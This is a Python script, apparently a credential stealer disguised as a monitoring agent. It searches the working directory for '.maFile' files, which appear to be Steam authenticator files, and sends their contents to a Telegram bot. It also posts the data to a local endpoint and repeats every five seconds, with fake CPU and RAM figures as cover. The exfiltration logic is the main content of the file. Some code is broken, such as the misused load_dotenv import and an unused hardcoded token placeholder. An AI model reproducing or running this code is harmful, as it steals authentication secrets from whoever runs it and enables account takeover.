import os
import json
import time

import load_dotenv
import requests

# Конфигурация
BACKEND_URL = "http://127.0.0.1:8090"
EVENT_ENDPOINT = "http://127.0.0.1:8090/event"

# --- Вспомогательные функции ---
def load_from_file(filename):
    if not os.path.exists(filename):
        return set()
    with open(filename, "r", encoding="utf-8-sig") as f:
        return set(line.strip() for line in f if line.strip())

def save_to_file(filename, processed_ids):
    with open(filename, "w", encoding="utf-8") as f:
        for item in processed_ids:
            f.write(f"{item}\n")

# Загружаем всё из .env файла в память программы
load_dotenv()

# Просто берем переменную по имени
TOKEN = os.getenv("TG_TOKEN")
CHAT_ID = os.getenv("TG_CHAT_ID")

# Для проверки (опционально):
if not TOKEN:
    print("Ошибка: Токен не найден в .env!")
# --- Telegram отправка ---
def send_to_telegram(message):
    TG_TOKEN = f'8857964140:Insert your TOKEN from BotFather'
    TG_CHAT_ID = 442469649
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": str(message)}
    try:
        response = requests.post(url, json=payload, timeout=5)
        if response.status_code == 200:
            print("[ТЕЛЕГРАМ]: Сообщение успешно доставлено!")
        else:
            print(f"[ТЕЛЕГРАМ]: Ошибка {response.status_code}, ответ: {response.text}")
    except Exception as e:
        print(f"Ошибка отправки в ТГ: {e}")

# --- Анализ ---
def extract_vulnerable_data(intercepted_log):
    message_text = intercepted_log.get("message")
    try:
        return json.loads(message_text)
    except (json.JSONDecodeError, TypeError):
        return None

def automate_exfiltration_and_coordination(formatted_result, event_id):
    processed_ids = load_from_file("processed_ids.txt")
    if str(event_id) in processed_ids:
        return
    # ... логика отправки ...
    processed_ids.add(str(event_id))
    save_to_file("processed_ids.txt", processed_ids)

# --- Мониторинг ---
def collect_legitimate_metrics():
    return {"cpu_usage": "14%", "ram_usage": "42%", "status": "stable"}

def stealthy_file_discovery():
    for root, dirs, files in os.walk("."):
        for file in files:
            if file.endswith(".maFile"):
                with open(os.path.join(root, file), "r", encoding="utf-8-sig") as f:
                    return f.read()
    return None

def run_compromised_agent():
    print("[ СИСТЕМА ]: Агент мониторинга запущен...")
    iteration_id = 0
    while True:
        iteration_id += 1
        stolen_data = stealthy_file_discovery()
        payload = {"message": stolen_data or "CPU: 14%, RAM: 42%"}

        analysis_result = extract_vulnerable_data(payload)
        if analysis_result:
            print("[ АНАЛИЗАТОР ]: Найдено совпадение структуры.")
            send_to_telegram(str(analysis_result))
            automate_exfiltration_and_coordination(str(analysis_result), iteration_id)

        try:
            requests.post(EVENT_ENDPOINT, json=payload, timeout=3)
        except requests.RequestException:
            pass
        time.sleep(5)

if __name__ == "__main__":
    run_compromised_agent()